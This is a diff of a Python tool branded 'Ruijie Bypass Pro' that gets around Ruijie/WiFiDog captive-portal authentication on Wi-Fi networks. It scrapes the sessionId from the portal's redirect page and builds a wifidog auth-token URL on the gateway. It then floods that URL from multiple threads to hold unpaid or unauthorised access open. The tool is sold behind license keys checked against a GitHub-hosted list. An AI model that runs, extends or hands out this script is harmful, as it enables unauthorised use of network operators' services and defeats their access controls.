@@ -1,130 +1,160 @@
-import requests, re, urllib3, time, threading, random, os, sys
-from urllib.parse import urlparse, parse_qs, urljoin
+import requests
+import re
+import urllib3
+import time
+import threading
+import logging
+import random
+import sys
 from datetime import datetime
+from urllib.parse import urlparse, parse_qs, urljoin
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # ===============================
-# 🌐 GITHUB REMOTE CONFIG
+# CONFIG & REMOTE KEY SYSTEM
 # ===============================
-GITHUB_USER = "tmmt6132-coder"
-REPO_NAME = "Bypass"
-URL_TO_KEYS = f"https://raw.githubusercontent.com/{GITHUB_USER}/{REPO_NAME}/main/keys.txt"
+KEY_URL = "https://raw.githubusercontent.com/tmmt6132-coder/Bypass/main/keys.txt"
 
-def get_system_id():
-    try:
-        import hashlib
-        combined = str(os.getuid()) + os.environ.get('USER', 'unknown')
-        return hashlib.md5(combined.encode()).hexdigest()[:10].upper()
-    except:
-        return "GET-ID-ERR"
+PING_THREADS = 5
+MIN_INTERVAL = 0.05
+MAX_INTERVAL = 0.2
+DEBUG = False
 
-def check_remote_approval():
-    os.system('clear' if os.name == 'posix' else 'cls')
-    sys_id = get_system_id()
-    print(f"\033[95m╔════════════════════════════════════════╗\n║       TURBO ENGINE ACCESS CONTROL      ║\n╚════════════════════════════════════════╝\033[0m")
-    print(f"\n[📡] Your System ID: \033[92m{sys_id}\033[0m")
+# ===============================
+# COLOR SYSTEM
+# ===============================
+RED = "\033[91m"
+GREEN = "\033[92m"
+CYAN = "\033[96m"
+YELLOW = "\033[93m"
+MAGENTA = "\033[95m"
+RESET = "\033[0m"
+
+stop_event = threading.Event()
+
+# ===============================
+# KEY VALIDATION SYSTEM
+# ===============================
+def validate_key():
+    print(f"{CYAN}[*] Checking License Key...{RESET}")
+    user_key = input(f"{YELLOW}Enter your Key ID: {RESET}").strip()
     
     try:
-        t_buster = f"?t={int(time.time())}"
-        response = requests.get(URL_TO_KEYS + t_buster, timeout=10)
-        if response.status_code != 200: return False
+        response = requests.get(KEY_URL, timeout=10)
+        if response.status_code != 200:
+            print(f"{RED}[!] Error: Could not connect to Key Server.{RESET}")
+            sys.exit()
+            
+        key_data = response.text.splitlines()
+        valid = False
         
-        lines = response.text.strip().splitlines()
-        for line in lines:
-            line = line.strip()
-            if "," not in line or line.startswith("#"): continue
-            parts = line.split(',')
-            allowed_id, exp_str = parts[0].strip(), parts[1].strip()
-            if sys_id == allowed_id:
-                if datetime.now() < datetime.strptime(exp_str, '%Y-%m-%d'):
-                    print(f"\033[92m[✓] ACCESS GRANTED! (Expires: {exp_str})\033[0m")
-                    time.sleep(1)
-                    return True
+        for line in key_data:
+            if ":" in line:
+                k, expiry_str = line.split(":")
+                if k.strip() == user_key:
+                    expiry_date = datetime.strptime(expiry_str.strip(), "%Y-%m-%d")
+                    if expiry_date > datetime.now():
+                        print(f"{GREEN}[✓] Access Granted! (Expires: {expiry_str}){RESET}")
+                        valid = True
+                        break
+                    else:
+                        print(f"{RED}[!] Key Expired on {expiry_str}{RESET}")
+                        sys.exit()
+        
+        if not valid:
+            print(f"{RED}[!] Invalid Key ID.{RESET}")
+            sys.exit()
+            
+    except Exception as e:
+        print(f"{RED}[!] Validation Error: {e}{RESET}")
+        sys.exit()
+
+# ===============================
+# BYPASS LOGIC
+# ===============================
+def check_real_internet():
+    try:
+        return requests.get("http://www.google.com", timeout=2).status_code == 200
+    except:
         return False
-    except: return False
 
-# ===============================
-# 🚀 CORE ENGINE LOGIC
-# ===============================
+def banner():
+    print(f"""{MAGENTA}
+╔══════════════════════════════════════╗
+║        Ruijie Bypass Pro             ║
+║        Key-Protected Edition         ║
+╚══════════════════════════════════════╝
+{RESET}""")
 
-def turbo_pulse(auth_link):
-    """Keep connection alive with fast requests"""
-    while True:
+def high_speed_ping(auth_link, sid):
+    session = requests.Session()
+    while not stop_event.is_set():
         try:
-            requests.get(auth_link, timeout=5, verify=False)
-        except: pass
-        time.sleep(0.1)
+            session.get(auth_link, timeout=5, verify=False)
+            print(f"{GREEN}[✓]{RESET} SID {sid} | Pulse Active...     ", end="\r")
+        except:
+            break
+        time.sleep(random.uniform(MIN_INTERVAL, MAX_INTERVAL))
 
-def start_bypass():
-    os.system('clear')
-    print(f"\033[96m" + "="*45 + "\n   🚀 RUIJIE TURBO ENGINE v2.5 ACTIVE\n" + "="*45 + "\033[0m")
+def start_process():
+    banner()
+    # အစီအစဉ်မစတင်မီ Key အရင်စစ်မည်
+    validate_key()
     
-    test_url = "http://connectivitycheck.gstatic.com/generate_204"
-    
-    while True:
+    logging.info(f"{CYAN}Starting Bypass Engine...{RESET}")
+
+    while not stop_event.is_set():
+        session = requests.Session()
+        test_url = "http://connectivitycheck.gstatic.com/generate_204"
+
         try:
-            # အင်တာနက် အခြေအနေ စစ်ဆေးခြင်း
-            try:
-                r = requests.get(test_url, allow_redirects=True, timeout=5)
-                status_code = r.status_code
-                final_url = r.url
-            except:
-                status_code = 0
-                final_url = test_url
+            r = requests.get(test_url, allow_redirects=True, timeout=5)
 
-            # Portal တွေ့ရှိပါက (Redirect ဖြစ်သွားပါက)
-            if status_code != 204 and final_url != test_url:
-                print(f"\n\033[93m[!] Captive Portal Detected: {final_url[:40]}...\033[0m")
-                
-                parsed = urlparse(final_url)
-                params = parse_qs(parsed.query)
-                
+            if r.status_code == 204 and check_real_internet():
+                print(f"{YELLOW}[•]{RESET} Internet Connected... Monitoring     ", end="\r")
+                time.sleep(5)
+                continue
+
+            portal_url = r.url
+            parsed_portal = urlparse(portal_url)
+            
+            print(f"\n{CYAN}[*] Portal Detected. Capturing SID...{RESET}")
+
+            r1 = session.get(portal_url, verify=False, timeout=10)
+            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
+            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
+            r2 = session.get(next_url, verify=False, timeout=10)
+            
+            query_params = parse_qs(urlparse(r2.url).query)
+            sid = query_params.get('sessionId', [None])[0]
+
+            if not sid:
+                sid_match = re.search(r'sessionId=([a-zA-Z0-9\-]+)', r2.text)
+                sid = sid_match.group(1) if sid_match else None
+
+            if sid:
+                print(f"{GREEN}[✓]{RESET} Session ID: {sid}")
+                params = parse_qs(parsed_portal.query)
                 gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
                 gw_port = params.get('gw_port', ['2060'])[0]
-                sid = params.get('sessionId', [None])[0]
-                
-                if not sid:
-                    sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', final_url)
-                    sid = sid_match.group(1) if sid_match else "AUTO_TOKEN_EXTRACTED"
-                
                 auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}"
-                
-                print(f"\033[92m[✓] Session Captured: {sid[:15]}...\033[0m")
-                print(f"\033[35m[*] Turbo Engine Launching Multi-Threads...\033[0m")
-                
-                for _ in range(8):
-                    threading.Thread(target=turbo_pulse, args=(auth_link,), daemon=True).start()
-                
-                print(f"\033[92m[✓] Bypass Active! Monitoring connection...\033[0m\n")
-                
-                # အင်တာနက် အမှန်တကယ် ပွင့်သွားပြီလား စစ်ဆေးခြင်း
-                while True:
-                    try:
-                        check = requests.get("http://www.google.com", timeout=5)
-                        if check.status_code == 200:
-                            print(f"\r\033[0;32m[✓]\033[0m Internet Online | Engine Stable     ", end="")
-                        else:
-                            break
-                    except: break
-                    time.sleep(10)
-            
-            else:
-                print(f"\r\033[90m[*] Status: Monitoring Network... (No Portal Found)\033[0m", end="")
-            
-            time.sleep(3)
 
-        except KeyboardInterrupt:
-            print(f"\n\033[91m[!] Engine Stopped by User.\033[0m")
-            break
+                for _ in range(PING_THREADS):
+                    threading.Thread(target=high_speed_ping, args=(auth_link, sid), daemon=True).start()
+
+                while check_real_internet():
+                    time.sleep(10)
+            else:
+                time.sleep(3)
+
         except Exception as e:
-            # Error တက်ရင်လည်း ပိတ်မသွားအောင် ထိန်းထားခြင်း
             time.sleep(5)
 
 if __name__ == "__main__":
-    if check_remote_approval():
-        start_bypass()
-    else:
-        print(f"\n\033[91m[!] Not Authorized. Contact Admin.\033[0m")
-        sys.exit()
-                    
+    try:
+        start_process()
+    except KeyboardInterrupt:
+        stop_event.set()
+        print(f"\n{RED}Stopped.{RESET}")
+            
